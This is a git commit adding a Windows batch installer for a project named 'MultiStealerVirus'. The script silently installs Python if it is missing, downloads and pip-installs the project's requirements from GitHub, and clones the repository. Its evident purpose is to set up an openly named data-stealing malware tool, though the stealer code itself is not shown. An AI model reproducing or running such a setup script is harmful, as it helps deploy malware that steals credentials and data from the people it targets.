30dccf45542356f9a6bab7a4cdc05c496c6b1b4e
Josakko <112590914+Josakko@users.noreply.github.com>
2023-05-10 18:06:13 +0200

    Add files via upload

---
+++ setup.bat
@@ -0,0 +1,29 @@
+@echo off
+
+
+python --version
+if %errorlevel% neq 0 (
+  echo Installing Python...
+  powershell.exe -Command "& {Invoke-WebRequest -Uri https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe -OutFile python-3.10.0-amd64.exe}"
+  python-3.10.0-amd64.exe /quiet InstallAllUsers=1 PrependPath=1
+)
+
+
+echo Installing dependencies...
+powershell.exe -Command "& {Invoke-WebRequest -Uri https://raw.githubusercontent.com/Josakko/MultiStealerVirus/main/requirements.txt -OutFile requirements.txt}"
+pip install -r requirements.txt
+
+echo Installation complete!
+pause
+
+
+where git > nul
+if %errorlevel% neq 0 (
+  echo Git is not installed. Please install Git or clone the repository manually!
+  pause
+  exit
+)
+
+echo Cloning repository...
+git clone https://github.com/Josakko/MultiStealerVirus.git
+echo Setup complete!
